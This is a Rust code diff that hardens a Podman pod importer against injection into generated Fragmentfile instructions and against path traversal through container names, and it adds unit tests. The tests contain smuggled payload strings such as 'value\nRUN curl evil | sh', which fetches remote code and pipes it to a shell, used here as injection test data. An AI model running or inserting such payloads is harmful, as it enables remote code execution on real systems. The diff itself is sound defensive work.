@@ -22,6 +22,27 @@ pub struct ContainerConfig {
     pub environment: Vec<(String, String)>,
 }
 
+/// Escape a value so it stays inside a double-quoted Fragmentfile ENV value.
+///
+/// Newlines would otherwise terminate the instruction and let a container's
+/// environment inject arbitrary Fragmentfile lines.
+fn escape_env_value(value: &str) -> String {
+    value
+        .replace('\\', "\\\\")
+        .replace('"', "\\\"")
+        .replace(['\n', '\r'], " ")
+}
+
+/// Environment variable names must be plain identifiers.
+fn is_valid_env_key(key: &str) -> bool {
+    let mut chars = key.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
 /// Import Podman pod configuration
 pub fn import_pod(pod_name: &str, output_dir: &Path) -> Result<PodConfig> {
     log::info!("Importing Podman pod: {}", pod_name);
@@ -65,6 +86,20 @@ pub fn import_pod(pod_name: &str, output_dir: &Path) -> Result<PodConfig> {
     let mut containers = Vec::new();
     for cid in container_ids {
         if let Ok(container_config) = inspect_container(&cid) {
+            // Never let a container name escape the output directory.
+            if container_config.name.is_empty()
+                || container_config.name.contains('/')
+                || container_config.name == "."
+                || container_config.name == ".."
+                || container_config.name.contains('\0')
+            {
+                log::warn!(
+                    "Skipping container with unsafe name: {:?}",
+                    container_config.name
+                );
+                continue;
+            }
+
             // Generate Fragmentfile for this container
             let output_path = output_dir.join(format!("{}.Fragmentfile", container_config.name));
             if let Err(e) = generate_fragmentfile_from_pod(&container_config, &output_path) {
@@ -161,7 +196,11 @@ pub fn generate_fragmentfile_from_pod(container: &ContainerConfig, output: &Path
 
     // Add environment variables
     for (key, value) in &container.environment {
-        fragmentfile.push_str(&format!("ENV {}=\"{}\"\n", key, value));
+        if !is_valid_env_key(key) {
+            log::warn!("Skipping invalid environment variable name: {:?}", key);
+            continue;
+        }
+        fragmentfile.push_str(&format!("ENV {}=\"{}\"\n", key, escape_env_value(value)));
     }
 
     // Add command if specified
@@ -172,4 +211,67 @@ pub fn generate_fragmentfile_from_pod(container: &ContainerConfig, output: &Path
     std::fs::write(output, fragmentfile)?;
 
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_escape_env_value_blocks_instruction_injection() {
+        assert_eq!(
+            escape_env_value("value\nRUN curl evil | sh"),
+            "value RUN curl evil | sh"
+        );
+        assert_eq!(escape_env_value("a\"b"), "a\\\"b");
+        assert_eq!(escape_env_value("a\\b"), "a\\\\b");
+    }
+
+    #[test]
+    fn test_is_valid_env_key() {
+        assert!(is_valid_env_key("PATH"));
+        assert!(is_valid_env_key("_FOO1"));
+        assert!(!is_valid_env_key(""));
+        assert!(!is_valid_env_key("1FOO"));
+        assert!(!is_valid_env_key("FOO=bar"));
+        assert!(!is_valid_env_key("FOO\nRUN x"));
+    }
+
+    #[test]
+    fn test_generated_fragmentfile_cannot_be_injected() {
+        let dir = std::env::temp_dir().join(format!(
+            "phantom-migrate-podman-test-{}",
+            std::process::id()
+        ));
+        std::fs::create_dir_all(&dir).unwrap();
+        let output = dir.join("test.Fragmentfile");
+
+        let container = ContainerConfig {
+            name: "web".to_string(),
+            image: "alpine".to_string(),
+            command: None,
+            environment: vec![
+                (
+                    "SAFE".to_string(),
+                    "value\nRUN touch /tmp/pwned".to_string(),
+                ),
+                ("BAD KEY".to_string(), "ignored".to_string()),
+            ],
+        };
+
+        generate_fragmentfile_from_pod(&container, &output).unwrap();
+        let content = std::fs::read_to_string(&output).unwrap();
+
+        assert!(content.contains("ENV SAFE=\"value RUN touch /tmp/pwned\""));
+        assert!(
+            !content
+                .lines()
+                .any(|line| line.trim() == "RUN touch /tmp/pwned"),
+            "env value escaped its ENV instruction: {}",
+            content
+        );
+        assert!(!content.contains("BAD KEY"));
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
 }
